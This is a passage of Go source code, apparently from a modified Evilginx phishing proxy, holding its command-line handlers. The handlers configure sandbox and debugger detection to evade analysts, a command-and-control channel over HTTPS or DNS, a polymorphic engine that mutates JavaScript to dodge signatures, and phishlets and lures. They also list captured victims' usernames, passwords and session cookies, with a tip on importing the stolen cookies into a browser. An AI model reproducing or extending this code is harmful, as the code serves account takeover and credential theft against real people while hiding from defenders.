		rate, err := strconv.Atoi(args[1])
		if err != nil || rate < 1 {
			return fmt.Errorf("invalid rate: %s (must be positive integer)", args[1])
		}
		burst, err := strconv.Atoi(args[2])
		if err != nil || burst < 1 {
			return fmt.Errorf("invalid burst: %s (must be positive integer)", args[2])
		}
		t.cfg.SetTrafficShapingPerIPLimit(rate, burst)
		log.Success("Per-IP rate limit set to: %d/s (burst: %d)", rate, burst)
		return nil
		
	case "bandwidth-limit":
		if pn < 2 {
			return fmt.Errorf("syntax: traffic-shaping bandwidth-limit <bytes/sec>")
		}
		limit, err := strconv.ParseInt(args[1], 10, 64)
		if err != nil || limit < 0 {
			return fmt.Errorf("invalid limit: %s (must be non-negative integer)", args[1])
		}
		t.cfg.SetTrafficShapingBandwidthLimit(limit)
		log.Success("Bandwidth limit set to: %d bytes/s", limit)
		return nil
		
	case "geo-rule":
		if pn < 6 {
			return fmt.Errorf("syntax: traffic-shaping geo-rule <country> <rate> <burst> <priority> <block>")
		}
		country := strings.ToUpper(args[1])
		rate, err := strconv.Atoi(args[2])
		if err != nil {
			return fmt.Errorf("invalid rate: %s", args[2])
		}
		burst, err := strconv.Atoi(args[3])
		if err != nil {
			return fmt.Errorf("invalid burst: %s", args[3])
		}
		priority, err := strconv.Atoi(args[4])
		if err != nil {
			return fmt.Errorf("invalid priority: %s", args[4])
		}
		blocked := false
		if args[5] == "true" || args[5] == "yes" || args[5] == "block" {
			blocked = true
		}
		
		t.cfg.SetTrafficShapingGeoRule(country, rate, burst, priority, blocked)
		log.Success("Geographic rule for %s configured", country)
		return nil
		
	case "stats":
		if t.p.trafficShaper == nil {
			return fmt.Errorf("traffic shaping not initialized")
		}
		
		stats := t.p.trafficShaper.GetStats()
		log.Info("=== Traffic Shaping Statistics ===")
		log.Info("")
		log.Info("Configuration:")
		log.Info("  Enabled: %v", stats["enabled"])
		log.Info("  Mode: %s", stats["mode"])
		log.Info("")
		log.Info("Traffic Metrics:")
		log.Info("  Total Requests: %d", stats["total_requests"])
		log.Info("  Allowed Requests: %d", stats["allowed_requests"])
		log.Info("  Rate Limited: %d", stats["rate_limited"])
		log.Info("  DDoS Blocked: %d", stats["ddos_blocked"])
		log.Info("  Bandwidth Used: %d bytes", stats["bandwidth_used"])
		log.Info("  Peak Rate: %.2f req/min", stats["peak_rate"])
		log.Info("")
		log.Info("Active Components:")
		log.Info("  IP Limiters: %d", stats["active_limiters"])
		log.Info("  Queue Size: %d", stats["queue_size"])
		log.Info("  Anomaly Events: %d", stats["anomaly_events"])
		
		// Show geographic blocks if any
		if geoBlocks, ok := stats["geographic_blocks"].(map[string]int64); ok && len(geoBlocks) > 0 {
			log.Info("")
			log.Info("Geographic Blocks:")
			for country, count := range geoBlocks {
				log.Info("  %s: %d", country, count)
			}
		}
		return nil
		
	default:
		return fmt.Errorf("unknown subcommand: %s", args[0])
	}
}

func (t *Terminal) handleSandbox(args []string) error {
	pn := len(args)
	
	// No arguments - show current configuration
	if pn == 0 {
		config := t.cfg.GetSandboxDetectionConfig()
		if config != nil {
			log.Info("Sandbox Detection Configuration:")
			log.Info("  Enabled: %v", config.Enabled)
			log.Info("  Mode: %s", config.Mode)
			log.Info("  Detection Threshold: %.2f", config.DetectionThreshold)
			log.Info("  Action on Detection: %s", config.ActionOnDetection)
			log.Info("  Server-side Checks: %v", config.ServerSideChecks)
			log.Info("  Client-side Checks: %v", config.ClientSideChecks)
			
			if t.p.sandboxDetector != nil {
				stats := t.p.sandboxDetector.GetStats()
				log.Info("")
				log.Info("Statistics:")
				log.Info("  Total Checks: %d", stats["total_checks"])
				log.Info("  Sandboxes Detected: %d", stats["sandbox_detected"])
				log.Info("  VMs Detected: %d", stats["vm_detected"])
				log.Info("  Debuggers Detected: %d", stats["debugger_detected"])
			}
		} else {
			log.Info("Sandbox detection not configured")
		}
		
		log.Info("")
		log.Info("Use 'sandbox enable on' to enable sandbox detection")
		log.Info("Use 'sandbox stats' for detailed statistics")
		return nil
	}
	
	// Handle subcommands
	switch args[0] {
	case "enable":
		if pn < 2 {
			return fmt.Errorf("syntax: sandbox enable <on|off>")
		}
		switch args[1] {
		case "on":
			t.cfg.SetSandboxDetectionEnabled(true)
			// Initialize if not already done
			if t.p.sandboxDetector == nil {
				t.p.sandboxDetector = NewSandboxDetector(t.cfg.GetSandboxDetectionConfig(), t.p.obfuscator)
			}
			log.Success("Sandbox detection enabled")
		case "off":
			t.cfg.SetSandboxDetectionEnabled(false)
			log.Success("Sandbox detection disabled")
		default:
			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
		}
		return nil
		
	case "mode":
		if pn < 2 {
			return fmt.Errorf("syntax: sandbox mode <passive|active|aggressive>")
		}
		mode := args[1]
		if mode != "passive" && mode != "active" && mode != "aggressive" {
			return fmt.Errorf("invalid mode: %s (use: passive, active, aggressive)", mode)
		}
		t.cfg.SetSandboxDetectionMode(mode)
		log.Success("Sandbox detection mode set to: %s", mode)
		return nil
		
	case "threshold":
		if pn < 2 {
			return fmt.Errorf("syntax: sandbox threshold <0.0-1.0>")
		}
		threshold, err := strconv.ParseFloat(args[1], 64)
		if err != nil || threshold < 0.0 || threshold > 1.0 {
			return fmt.Errorf("invalid threshold: %s (must be between 0.0 and 1.0)", args[1])
		}
		t.cfg.SetSandboxDetectionThreshold(threshold)
		log.Success("Sandbox detection threshold set to: %.2f", threshold)
		return nil
		
	case "action":
		if pn < 2 {
			return fmt.Errorf("syntax: sandbox action <block|redirect|honeypot>")
		}
		action := args[1]
		if action != "block" && action != "redirect" && action != "honeypot" {
			return fmt.Errorf("invalid action: %s (use: block, redirect, honeypot)", action)
		}
		t.cfg.SetSandboxDetectionAction(action)
		log.Success("Sandbox detection action set to: %s", action)
		return nil
		
	case "redirect":
		if pn < 2 {
			return fmt.Errorf("syntax: sandbox redirect <url>")
		}
		redirectURL := args[1]
		// Validate URL
		if !strings.HasPrefix(redirectURL, "http://") && !strings.HasPrefix(redirectURL, "https://") {
			return fmt.Errorf("invalid URL: %s (must start with http:// or https://)", redirectURL)
		}
		t.cfg.SetSandboxDetectionRedirect(redirectURL)
		log.Success("Sandbox redirect URL set to: %s", redirectURL)
		return nil
		
	case "honeypot":
		if pn < 2 {
			return fmt.Errorf("syntax: sandbox honeypot <html>")
		}
		// Join all args as the HTML might contain spaces
		honeypotHTML := strings.Join(args[1:], " ")
		t.cfg.SetSandboxDetectionHoneypot(honeypotHTML)
		log.Success("Sandbox honeypot response configured")
		return nil
		
	case "stats":
		if t.p.sandboxDetector == nil {
			return fmt.Errorf("sandbox detection not initialized")
		}
		
		stats := t.p.sandboxDetector.GetStats()
		log.Info("=== Sandbox Detection Statistics ===")
		log.Info("")
		log.Info("Detection Summary:")
		log.Info("  Total Checks: %d", stats["total_checks"])
		log.Info("  Sandboxes Detected: %d", stats["sandbox_detected"])
		log.Info("  VMs Detected: %d", stats["vm_detected"])
		log.Info("  Debuggers Detected: %d", stats["debugger_detected"])
		log.Info("  Cache Size: %d", stats["cache_size"])
		log.Info("")
		log.Info("Detection Methods:")
		if methods, ok := stats["detection_methods"].(map[string]int64); ok {
			for method, count := range methods {
				log.Info("  %s: %d detections", method, count)
			}
		}
		return nil
		
	default:
		return fmt.Errorf("unknown subcommand: %s", args[0])
	}
}

func (t *Terminal) handleC2(args []string) error {
	pn := len(args)
	
	// No arguments - show current configuration
	if pn == 0 {
		config := t.cfg.GetC2ChannelConfig()
		if config != nil {
			log.Info("C2 Channel Configuration:")
			log.Info("  Enabled: %v", config.Enabled)
			log.Info("  Transport: %s", config.Transport)
			log.Info("  Servers: %d configured", len(config.Servers))
			log.Info("  Heartbeat Interval: %d seconds", config.HeartbeatInterval)
			log.Info("  Compression: %v", config.Compression)
			
			if t.p.c2Channel != nil {
				status := t.p.c2Channel.GetStatus()
				log.Info("")
				log.Info("Status:")
				log.Info("  Running: %v", status["running"])
				log.Info("  Connected: %v", status["connected"])
			}
		} else {
			log.Info("C2 channel not configured")
		}
		
		log.Info("")
		log.Info("Use 'c2 enable on' to enable C2 channel")
		log.Info("Use 'c2 status' for detailed statistics")
		return nil
	}
	
	// Handle subcommands
	switch args[0] {
	case "enable":
		if pn < 2 {
			return fmt.Errorf("syntax: c2 enable <on|off>")
		}
		switch args[1] {
		case "on":
			t.cfg.SetC2ChannelEnabled(true)
			// Initialize if not already done
			if t.p.c2Channel == nil {
				c2, err := NewC2Channel(t.cfg.GetC2ChannelConfig(), t.p.db)
				if err != nil {
					return fmt.Errorf("failed to initialize C2 channel: %v", err)
				}
				t.p.c2Channel = c2
			}
			// Start C2 channel
			if err := t.p.c2Channel.Start(); err != nil {
				return fmt.Errorf("failed to start C2 channel: %v", err)
			}
			log.Success("C2 channel enabled")
		case "off":
			t.cfg.SetC2ChannelEnabled(false)
			if t.p.c2Channel != nil {
				t.p.c2Channel.Stop()
			}
			log.Success("C2 channel disabled")
		default:
			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
		}
		return nil
		
	case "transport":
		if pn < 2 {
			return fmt.Errorf("syntax: c2 transport <https|dns>")
		}
		transport := args[1]
		if transport != "https" && transport != "dns" {
			return fmt.Errorf("invalid transport: %s (use: https, dns)", transport)
		}
		t.cfg.SetC2ChannelTransport(transport)
		log.Success("C2 transport set to: %s", transport)
		return nil
		
	case "server":
		if pn < 2 {
			return fmt.Errorf("syntax: c2 server <add|remove|list>")
		}
		switch args[1] {
		case "add":
			if pn < 5 {
				return fmt.Errorf("syntax: c2 server add <id> <url> <priority>")
			}
			id := args[2]
			url := args[3]
			priority, err := strconv.Atoi(args[4])
			if err != nil {
				return fmt.Errorf("invalid priority: %s", args[4])
			}
			if err := t.cfg.AddC2Server(id, url, priority); err != nil {
				return err
			}
			log.Success("C2 server added: %s", id)
			return nil
			
		case "remove":
			if pn < 3 {
				return fmt.Errorf("syntax: c2 server remove <id>")
			}
			if err := t.cfg.RemoveC2Server(args[2]); err != nil {
				return err
			}
			log.Success("C2 server removed: %s", args[2])
			return nil
			
		case "list":
			config := t.cfg.GetC2ChannelConfig()
			if len(config.Servers) == 0 {
				log.Info("No C2 servers configured")
			} else {
				log.Info("C2 Servers:")
				for _, server := range config.Servers {
					status := "active"
					if !server.Active {
						status = "inactive"
					}
					log.Info("  [%s] %s (priority: %d, status: %s)", server.ID, server.URL, server.Priority, status)
				}
			}
			return nil
			
		default:
			return fmt.Errorf("unknown server command: %s", args[1])
		}
		
	case "key":
		if pn < 2 {
			return fmt.Errorf("syntax: c2 key <generate|import|export>")
		}
		switch args[1] {
		case "generate":
			// Generate new key
			encryptor, err := NewC2Encryptor("")
			if err != nil {
				return err
			}
			key := encryptor.ExportPrivateKey()
			t.cfg.SetC2ChannelKey(key)
			log.Success("New encryption key generated")
			log.Info("Public key: %s", encryptor.ExportPublicKey())
			return nil
			
		case "import":
			if pn < 3 {
				return fmt.Errorf("syntax: c2 key import <base64_key>")
			}
			t.cfg.SetC2ChannelKey(args[2])
			log.Success("Encryption key imported")
			return nil
			
		case "export":
			config := t.cfg.GetC2ChannelConfig()
			if config.EncryptionKey == "" {
				log.Info("No encryption key configured")
			} else {
				log.Info("Private key (base64):")
				log.Info("%s", config.EncryptionKey)
			}
			return nil
			
		default:
			return fmt.Errorf("unknown key command: %s", args[1])
		}
		
	case "auth":
		if pn < 2 {
			return fmt.Errorf("syntax: c2 auth <token>")
		}
		t.cfg.SetC2ChannelAuthToken(args[1])
		log.Success("Authentication token set")
		return nil
		
	case "test":
		if t.p.c2Channel == nil {
			return fmt.Errorf("C2 channel not initialized")
		}
		
		log.Info("Testing C2 connection...")
		
		// Send test command
		cmdId, err := t.p.c2Channel.SendCommand("test", map[string]interface{}{
			"message": "Connection test from Evilginx",
			"timestamp": time.Now().Unix(),
		})
		
		if err != nil {
			log.Error("C2 test failed: %v", err)
			return err
		}
		
		log.Success("C2 test command sent (ID: %s)", cmdId)
		return nil
		
	case "status":
		if t.p.c2Channel == nil {
			return fmt.Errorf("C2 channel not initialized")
		}
		
		stats := t.p.c2Channel.GetStats()
		log.Info("=== C2 Channel Statistics ===")
		log.Info("")
		log.Info("Connection:")
		log.Info("  Attempts: %d", stats["connection_attempts"])
		log.Info("  Successful: %d", stats["successful_conns"])
		log.Info("  Failed: %d", stats["failed_conns"])
		log.Info("")
		log.Info("Commands:")
		log.Info("  Sent: %d", stats["commands_sent"])
		log.Info("  Received: %d", stats["commands_received"])
		log.Info("")
		log.Info("Data Transfer:")
		log.Info("  Bytes Sent: %d", stats["bytes_sent"])
		log.Info("  Bytes Received: %d", stats["bytes_received"])
		log.Info("")
		if lastHeartbeat, ok := stats["last_heartbeat"].(time.Time); ok && !lastHeartbeat.IsZero() {
			log.Info("Last Heartbeat: %s ago", time.Since(lastHeartbeat))
		}
		if lastError, ok := stats["last_error"].(string); ok && lastError != "" {
			log.Info("Last Error: %s", lastError)
		}
		return nil
		
	default:
		return fmt.Errorf("unknown subcommand: %s", args[0])
	}
}

func (t *Terminal) handlePolymorphic(args []string) error {
	pn := len(args)
	
	// No arguments - show current configuration
	if pn == 0 {
		config := t.cfg.GetPolymorphicConfig()
		if config != nil {
			log.Info("Polymorphic Engine Configuration:")
			log.Info("  Enabled: %v", config.Enabled)
			log.Info("  Mutation Level: %s", config.MutationLevel)
			log.Info("  Cache Enabled: %v", config.CacheEnabled)
			log.Info("  Cache Duration: %d minutes", config.CacheDuration)
			log.Info("  Seed Rotation: %d minutes", config.SeedRotation)
			log.Info("  Template Mode: %v", config.TemplateMode)
			log.Info("  Preserve Semantics: %v", config.PreserveSemantics)
			
			if t.p.polymorphicEngine != nil {
				stats := t.p.polymorphicEngine.GetStats()
				log.Info("")
				log.Info("Statistics:")
				log.Info("  Total Mutations: %d", stats["total_mutations"])
				log.Info("  Unique Variants: %d", stats["unique_variants"])
				log.Info("  Cache Hits: %d", stats["cache_hits"])
				log.Info("  Cache Size: %d", stats["cache_size"])
			}
		} else {
			log.Info("Polymorphic engine not configured")
		}
		
		log.Info("")
		log.Info("Use 'polymorphic enable on' to enable polymorphic mutations")
		log.Info("Use 'polymorphic stats' for detailed statistics")
		return nil
	}
	
	// Handle subcommands
	switch args[0] {
	case "enable":
		if pn < 2 {
			return fmt.Errorf("syntax: polymorphic enable <on|off>")
		}
		switch args[1] {
		case "on":
			t.cfg.SetPolymorphicEnabled(true)
			// Initialize if not already done
			if t.p.polymorphicEngine == nil {
				t.p.polymorphicEngine = NewPolymorphicEngine(t.cfg.GetPolymorphicConfig())
			}
			log.Success("Polymorphic engine enabled")
		case "off":
			t.cfg.SetPolymorphicEnabled(false)
			log.Success("Polymorphic engine disabled")
		default:
			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
		}
		return nil
		
	case "level":
		if pn < 2 {
			return fmt.Errorf("syntax: polymorphic level <low|medium|high|extreme>")
		}
		level := args[1]
		if level != "low" && level != "medium" && level != "high" && level != "extreme" {
			return fmt.Errorf("invalid level: %s (use: low, medium, high, extreme)", level)
		}
		t.cfg.SetPolymorphicLevel(level)
		log.Success("Polymorphic mutation level set to: %s", level)
		return nil
		
	case "cache":
		if pn < 2 {
			return fmt.Errorf("syntax: polymorphic cache <on|off|clear>")
		}
		switch args[1] {
		case "on":
			t.cfg.SetPolymorphicCacheEnabled(true)
			log.Success("Polymorphic cache enabled")
		case "off":
			t.cfg.SetPolymorphicCacheEnabled(false)
			log.Success("Polymorphic cache disabled")
		case "clear":
			if t.p.polymorphicEngine != nil {
				t.p.polymorphicEngine.clearCache()
				log.Success("Polymorphic cache cleared")
			} else {
				return fmt.Errorf("polymorphic engine not initialized")
			}
		default:
			return fmt.Errorf("invalid option: %s (use: on, off, clear)", args[1])
		}
		return nil
		
	case "seed-rotation":
		if pn < 2 {
			return fmt.Errorf("syntax: polymorphic seed-rotation <minutes>")
		}
		minutes, err := strconv.Atoi(args[1])
		if err != nil || minutes < 0 {
			return fmt.Errorf("invalid minutes: %s", args[1])
		}
		t.cfg.SetPolymorphicSeedRotation(minutes)
		log.Success("Polymorphic seed rotation set to: %d minutes", minutes)
		return nil
		
	case "template-mode":
		if pn < 2 {
			return fmt.Errorf("syntax: polymorphic template-mode <on|off>")
		}
		switch args[1] {
		case "on":
			t.cfg.SetPolymorphicTemplateMode(true)
			log.Success("Polymorphic template mode enabled")
		case "off":
			t.cfg.SetPolymorphicTemplateMode(false)
			log.Success("Polymorphic template mode disabled")
		default:
			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
		}
		return nil
		
	case "mutation":
		if pn < 3 {
			return fmt.Errorf("syntax: polymorphic mutation <type> <on|off>")
		}
		mutationType := args[1]
		validTypes := []string{"variables", "functions", "deadcode", "controlflow", "strings", "math", "comments", "whitespace"}
		
		valid := false
		for _, vt := range validTypes {
			if mutationType == vt {
				valid = true
				break
			}
		}
		
		if !valid {
			return fmt.Errorf("invalid mutation type: %s (use: %s)", mutationType, strings.Join(validTypes, ", "))
		}
		
		enabled := false
		switch args[2] {
		case "on":
			enabled = true
		case "off":
			enabled = false
		default:
			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[2])
		}
		
		t.cfg.SetPolymorphicMutation(mutationType, enabled)
		log.Success("Polymorphic mutation '%s' %s", mutationType, map[bool]string{true: "enabled", false: "disabled"}[enabled])
		return nil
		
	case "test":
		if t.p.polymorphicEngine == nil {
			return fmt.Errorf("polymorphic engine not initialized")
		}
		
		// Default test code
		testCode := `function getData() { var result = 42; return result; }`
		
		if pn > 1 {
			// Use provided code
			testCode = strings.Join(args[1:], " ")
		}
		
		log.Info("Original code:")
		log.Info("%s", testCode)
		log.Info("")
		
		// Generate mutations
		context := &MutationContext{
			SessionID: "test-session",
			Timestamp: time.Now().Unix(),
		}
		
		for i := 1; i <= 3; i++ {
			context.Seed = int64(i)
			mutated := t.p.polymorphicEngine.Mutate(testCode, context)
			log.Info("Mutation %d (seed: %d):", i, context.Seed)
			log.Info("%s", mutated)
			log.Info("")
		}
		
		return nil
		
	case "stats":
		if t.p.polymorphicEngine == nil {
			return fmt.Errorf("polymorphic engine not initialized")
		}
		
		stats := t.p.polymorphicEngine.GetStats()
		log.Info("=== Polymorphic Engine Statistics ===")
		log.Info("")
		log.Info("Mutations:")
		log.Info("  Total Mutations: %d", stats["total_mutations"])
		log.Info("  Unique Variants: %d", stats["unique_variants"])
		log.Info("  Average Complexity: %.2f", stats["average_complexity"])
		log.Info("")
		log.Info("Cache:")
		log.Info("  Cache Hits: %d", stats["cache_hits"])
		log.Info("  Cache Size: %d entries", stats["cache_size"])
		
		if t.cfg.GetPolymorphicConfig().CacheEnabled {
			hitRate := float64(0)
			totalRequests := stats["total_mutations"].(int64) + stats["cache_hits"].(int64)
			if totalRequests > 0 {
				hitRate = float64(stats["cache_hits"].(int64)) / float64(totalRequests) * 100
			}
			log.Info("  Hit Rate: %.1f%%", hitRate)
		}
		
		return nil
		
	default:
		return fmt.Errorf("unknown subcommand: %s", args[0])
	}
}

func (t *Terminal) handleProxy(args []string) error {
	pn := len(args)
	if pn == 0 {
		var proxy_enabled string = "no"
		if t.cfg.proxyConfig.Enabled {
			proxy_enabled = "yes"
		}

		keys := []string{"enabled", "type", "address", "port", "username", "password"}
		vals := []string{proxy_enabled, t.cfg.proxyConfig.Type, t.cfg.proxyConfig.Address, strconv.Itoa(t.cfg.proxyConfig.Port), t.cfg.proxyConfig.Username, t.cfg.proxyConfig.Password}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 1 {
		switch args[0] {
		case "enable":
			err := t.p.setProxy(true, t.p.cfg.proxyConfig.Type, t.p.cfg.proxyConfig.Address, t.p.cfg.proxyConfig.Port, t.p.cfg.proxyConfig.Username, t.p.cfg.proxyConfig.Password)
			if err != nil {
				return err
			}
			t.cfg.EnableProxy(true)
			log.Important("you need to restart evilginx for the changes to take effect!")
			return nil
		case "disable":
			err := t.p.setProxy(false, t.p.cfg.proxyConfig.Type, t.p.cfg.proxyConfig.Address, t.p.cfg.proxyConfig.Port, t.p.cfg.proxyConfig.Username, t.p.cfg.proxyConfig.Password)
			if err != nil {
				return err
			}
			t.cfg.EnableProxy(false)
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "type":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			t.cfg.SetProxyType(args[1])
			return nil
		case "address":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			t.cfg.SetProxyAddress(args[1])
			return nil
		case "port":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			port, err := strconv.Atoi(args[1])
			if err != nil {
				return err
			}
			t.cfg.SetProxyPort(port)
			return nil
		case "username":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			t.cfg.SetProxyUsername(args[1])
			return nil
		case "password":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			t.cfg.SetProxyPassword(args[1])
			return nil
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleSessions(args []string) error {
	lblue := color.New(color.FgHiBlue)
	dgray := color.New(color.FgHiBlack)
	lgreen := color.New(color.FgHiGreen)
	yellow := color.New(color.FgYellow)
	lyellow := color.New(color.FgHiYellow)
	lred := color.New(color.FgHiRed)
	cyan := color.New(color.FgCyan)
	white := color.New(color.FgHiWhite)

	pn := len(args)
	if pn == 0 {
		cols := []string{"id", "phishlet", "username", "password", "tokens", "remote ip", "time"}
		sessions, err := t.db.ListSessions()
		if err != nil {
			return err
		}
		if len(sessions) == 0 {
			log.Info("no saved sessions found")
			return nil
		}
		var rows [][]string
		for _, s := range sessions {
			tcol := dgray.Sprintf("none")
			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
				tcol = lgreen.Sprintf("captured")
			}
			row := []string{strconv.Itoa(s.Id), lred.Sprintf(s.Phishlet), lblue.Sprintf(truncateString(s.Username, 24)), lblue.Sprintf(truncateString(s.Password, 24)), tcol, yellow.Sprintf(s.RemoteAddr), time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")}
			rows = append(rows, row)
		}
		log.Printf("\n%s\n", AsTable(cols, rows))
		return nil
	} else if pn == 1 {
		id, err := strconv.Atoi(args[0])
		if err != nil {
			return err
		}
		sessions, err := t.db.ListSessions()
		if err != nil {
			return err
		}
		if len(sessions) == 0 {
			log.Info("no saved sessions found")
			return nil
		}
		s_found := false
		for _, s := range sessions {
			if s.Id == id {
				_, err := t.cfg.GetPhishlet(s.Phishlet)
				if err != nil {
					log.Error("%v", err)
					break
				}

				s_found = true
				tcol := dgray.Sprintf("empty")
				if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
					tcol = lgreen.Sprintf("captured")
				}

				keys := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "user-agent", "remote ip", "create time", "update time"}
				vals := []string{strconv.Itoa(s.Id), lred.Sprint(s.Phishlet), lblue.Sprint(s.Username), lblue.Sprint(s.Password), tcol, yellow.Sprint(s.LandingURL), dgray.Sprint(s.UserAgent), yellow.Sprint(s.RemoteAddr), dgray.Sprint(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprint(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"))}
				log.Printf("\n%s\n", AsRows(keys, vals))

				if len(s.Custom) > 0 {
					tkeys := []string{}
					tvals := []string{}

					for k, v := range s.Custom {
						tkeys = append(tkeys, k)
						tvals = append(tvals, cyan.Sprint(v))
					}

					log.Printf("[ %s ]\n%s\n", white.Sprint("custom"), AsRows(tkeys, tvals))
				}

				if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
					if len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
						//var str_tokens string

						tkeys := []string{}
						tvals := []string{}

						for k, v := range s.BodyTokens {
							tkeys = append(tkeys, k)
							tvals = append(tvals, white.Sprint(v))
						}
						for k, v := range s.HttpTokens {
							tkeys = append(tkeys, k)
							tvals = append(tvals, white.Sprint(v))
						}

						log.Printf("[ %s ]\n%s\n", lgreen.Sprint("tokens"), AsRows(tkeys, tvals))
					}
					if len(s.CookieTokens) > 0 {
						json_tokens := t.cookieTokensToJSON(s.CookieTokens)
						log.Printf("[ %s ]\n%s\n\n", lyellow.Sprint("cookies"), json_tokens)
						log.Printf("%s %s %s %s%s\n\n", dgray.Sprint("(use"), cyan.Sprint("StorageAce"), dgray.Sprint("extension to import the cookies:"), white.Sprint("https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo"), dgray.Sprint(")"))
					}
				}
				break
			}
		}
		if !s_found {
			return fmt.Errorf("id %d not found", id)
		}
		return nil
	} else if pn == 2 {
		switch args[0] {
		case "delete":
			if args[1] == "all" {
				sessions, err := t.db.ListSessions()
				if err != nil {
					return err
				}
				if len(sessions) == 0 {
					break
				}
				for _, s := range sessions {
					err = t.db.DeleteSessionById(s.Id)
					if err != nil {
						log.Warning("delete: %v", err)
					} else {
						log.Info("deleted session with ID: %d", s.Id)
					}
				}
				t.db.Flush()
				return nil
			} else {
				rc := strings.Split(args[1], ",")
				for _, pc := range rc {
					pc = strings.TrimSpace(pc)
					rd := strings.Split(pc, "-")
					if len(rd) == 2 {
						b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
						if err != nil {
							log.Error("delete: %v", err)
							break
						}
						e_id, err := strconv.Atoi(strings.TrimSpace(rd[1]))
						if err != nil {
							log.Error("delete: %v", err)
							break
						}
						for i := b_id; i <= e_id; i++ {
							err = t.db.DeleteSessionById(i)
							if err != nil {
								log.Warning("delete: %v", err)
							} else {
								log.Info("deleted session with ID: %d", i)
							}
						}
					} else if len(rd) == 1 {
						b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
						if err != nil {
							log.Error("delete: %v", err)
							break
						}
						err = t.db.DeleteSessionById(b_id)
						if err != nil {
							log.Warning("delete: %v", err)
						} else {
							log.Info("deleted session with ID: %d", b_id)
						}
					}
				}
				t.db.Flush()
				return nil
			}
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handlePhishlets(args []string) error {
	pn := len(args)

	if pn >= 3 && args[0] == "create" {
		pl, err := t.cfg.GetPhishlet(args[1])
		if err == nil {
			params := make(map[string]string)

			var create_ok bool = true
			if pl.isTemplate {
				for n := 3; n < pn; n++ {
					val := args[n]

					sp := strings.Index(val, "=")
					if sp == -1 {
						return fmt.Errorf("set custom parameters for the child phishlet using format 'param1=value1 param2=value2'")
					}
					k := val[:sp]
					v := val[sp+1:]

					params[k] = v

					log.Info("adding parameter: %s='%s'", k, v)
				}
			}

			if create_ok {
				child_name := args[1] + ":" + args[2]
				err := t.cfg.AddSubPhishlet(child_name, args[1], params)
				if err != nil {
					log.Error("%v", err)
				} else {
					t.cfg.SaveSubPhishlets()
					log.Info("created child phishlet: %s", child_name)
				}
			}
			return nil
		} else {
			log.Error("%v", err)
		}
	} else if pn == 0 {
		t.output("%s", t.sprintPhishletStatus(""))
		return nil
	} else if pn == 1 {
		_, err := t.cfg.GetPhishlet(args[0])
		if err == nil {
			t.output("%s", t.sprintPhishletStatus(args[0]))
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "delete":
			err := t.cfg.DeleteSubPhishlet(args[1])
			if err != nil {
				log.Error("%v", err)
				return nil
			}
			t.cfg.SaveSubPhishlets()
			log.Info("deleted child phishlet: %s", args[1])
			return nil
		case "enable":
			pl, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				log.Error("%v", err)
				break
			}
			if pl.isTemplate {
				return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it.", args[1])
			}
			err = t.cfg.SetSiteEnabled(args[1])
			if err != nil {
				t.cfg.SetSiteDisabled(args[1])
				return err
			}
			t.manageCertificates(true)
			return nil
		case "disable":
			err := t.cfg.SetSiteDisabled(args[1])
			if err != nil {
				return err
			}
			t.manageCertificates(false)
			return nil
		case "hide":
			err := t.cfg.SetSiteHidden(args[1], true)
			if err != nil {
				return err
			}
			return nil
		case "unhide":
			err := t.cfg.SetSiteHidden(args[1], false)
			if err != nil {
				return err
			}
			return nil
		case "get-hosts":
			pl, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			bhost, ok := t.cfg.GetSiteDomain(pl.Name)
			if !ok || len(bhost) == 0 {
				return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
			}
			out := ""
			hosts := pl.GetPhishHosts(false)
			for n, h := range hosts {
				if n > 0 {
					out += "\n"
				}
				out += t.cfg.GetServerExternalIP() + " " + h
			}
			t.output("%s\n", out)
			return nil
		}
	} else if pn == 3 {
		switch args[0] {
		case "hostname":
			_, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			if ok := t.cfg.SetSiteHostname(args[1], args[2]); ok {
				t.cfg.SetSiteDisabled(args[1])
				t.manageCertificates(false)
			}
			return nil
		case "unauth_url":
			_, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			t.cfg.SetSiteUnauthUrl(args[1], args[2])
			return nil
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleLures(args []string) error {
	hiblue := color.New(color.FgHiBlue)
	yellow := color.New(color.FgYellow)
	higreen := color.New(color.FgHiGreen)
	green := color.New(color.FgGreen)
	//hiwhite := color.New(color.FgHiWhite)
	hcyan := color.New(color.FgHiCyan)
